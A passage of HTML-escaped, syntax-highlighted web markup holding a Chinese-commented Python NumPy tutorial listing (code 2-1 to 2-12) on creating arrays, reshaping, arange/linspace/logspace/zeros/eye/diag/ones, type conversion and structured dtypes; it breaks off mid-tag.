data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39; 创建的数组为： &#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; arr1&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 创建二维数组&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;arr2 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; np&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;array&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;9&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;创建的数组为：\n&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; arr2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;数组类型为：&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; arr2&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;dtype&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 查看数组类型&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;数组元素个数为：&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; arr2&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;size&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 查看数组元素个数&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;数组每个元素大小为：&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; arr2&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;itemsize&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 查看数组每个元素大小&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 代码 2-2&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;arr2&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;shape &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 重新设置 shape&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;重新设置shape 后的arr2 为：&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; arr2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 代码 2-3&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;使用arange函数创建的数组为：\n&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; np&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;arange&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0.1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 代码 2-4&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;使用linspace函数创建的数组为：&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; np&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;linspace&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;12&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 代码 2-5&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;使用logspace函数创建的数组为：&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; np&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;logspace&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;20&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 代码 2-6&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;使用zeros函数创建的数组为：&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; np&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;zeros&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 代码 2-7&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;使用eye函数创建的数组为：&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; np&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;eye&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;36&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 代码 2-8&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;37&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;使用diag函数创建的数组为：&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; np&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;diag&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;38&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;39&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 代码 2-9&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;40&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;使用ones函数的数组为：&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; np&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ones&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;41&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;42&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 代码 2-10&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;43&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;转换结果为：&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; np&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;float64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;42&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 整型转换为浮点型&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;44&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;转换结果为：&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; np&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;int8&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;42.0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 浮点型转换为整型&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;45&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;转换结果为：&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; np&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;bool&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;42&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 整型转换为布尔型&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;46&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;转换结果为：&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; np&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;bool&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 整型转换为布尔型&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;47&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;转换结果为：&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; np&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;float&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 布尔型转换为浮点型&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;48&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;转换结果为：&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; np&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;float&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;False&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 布尔型转换为浮点型&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;49&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;50&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 代码 2-11&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;51&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;df &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; np&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;dtype&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;name&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; np&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;str_&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;40&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;numitems&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; np&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;int64&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;52&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;               &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;price&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; np&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;float64&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;53&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;数据类型为：&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; df&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;54&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;55&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 代码 2-12&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;56&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;数据类型为：&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; df&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;name&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;57&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token 